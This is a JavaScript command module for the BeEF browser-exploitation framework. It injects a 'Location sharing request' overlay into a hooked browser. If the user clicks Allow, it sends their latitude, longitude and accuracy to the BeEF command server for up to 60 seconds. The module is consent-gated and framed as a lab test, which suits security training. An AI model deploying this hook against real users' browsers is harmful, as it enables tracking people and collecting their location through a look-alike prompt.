beef.execute(function() {
  var maxSeconds = 60;
  var box = document.createElement('div');
  box.style.cssText = 'position:fixed;z-index:2147483647;top:16px;right:16px;background:#fff;color:#111;padding:16px;border:2px solid #2563eb;border-radius:8px;font:14px sans-serif;max-width:320px;box-shadow:0 4px 18px #0004';
  box.innerHTML = '<strong>Location sharing request</strong><p>This lab test shares approximate browser coordinates for up to ' + maxSeconds + ' seconds. You can revoke it at any time.</p><button id="safe-location-start">Allow</button> <button id="safe-location-stop">Deny</button>';
  document.body.appendChild(box);
  var watchId = null;
  var timer = null;
  var sendAudit = function(value, status) { beef.net.send('<%= @command_url %>', <%= @command_id %>, 'audit=' + encodeURIComponent(value), status); };
  var stop = function(reason) {
    if (watchId !== null) navigator.geolocation.clearWatch(watchId);
    if (timer !== null) window.clearTimeout(timer);
    box.remove();
    sendAudit(reason, beef.status.success());
  };
  box.querySelector('#safe-location-stop').onclick = function() { stop('declined_or_revoked'); };
  box.querySelector('#safe-location-start').onclick = function() {
    if (!navigator.geolocation) { stop('unsupported'); return; }
    box.querySelector('#safe-location-start').disabled = true;
    box.querySelector('#safe-location-stop').textContent = 'Revoke';
    sendAudit('consented', beef.status.success());
    watchId = navigator.geolocation.watchPosition(function(position) {
      beef.net.send('<%= @command_url %>', <%= @command_id %>,
        'audit=position_update&latitude=' + position.coords.latitude + '&longitude=' + position.coords.longitude + '&accuracy=' + position.coords.accuracy,
        beef.status.success());
    }, function() { sendAudit('position_error', beef.status.error()); }, { enableHighAccuracy: false, maximumAge: 10000, timeout: 10000 });
    timer = window.setTimeout(function() { stop('expired'); }, maxSeconds * 1000);
  };
});
